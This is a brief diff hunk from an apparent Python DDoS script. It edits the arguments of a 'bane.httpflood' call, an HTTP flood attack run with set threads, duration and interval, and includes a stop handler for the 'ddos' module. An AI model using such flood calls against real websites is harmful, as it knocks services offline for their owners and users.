@@ -41,7 +41,7 @@ while(n<5):
  except:
   pass
 try:
- bane.httpflood(u,p=p,maxtime=ti,threads=th,interval=d,level=2,post_max=1000,post_min=500)
+ bane.httpflood(u,p=p,maxtime=ti,threads=th,interval=d,level=2)
 except KeyboardInterrupt:
  bane.ddos.stop=True
 
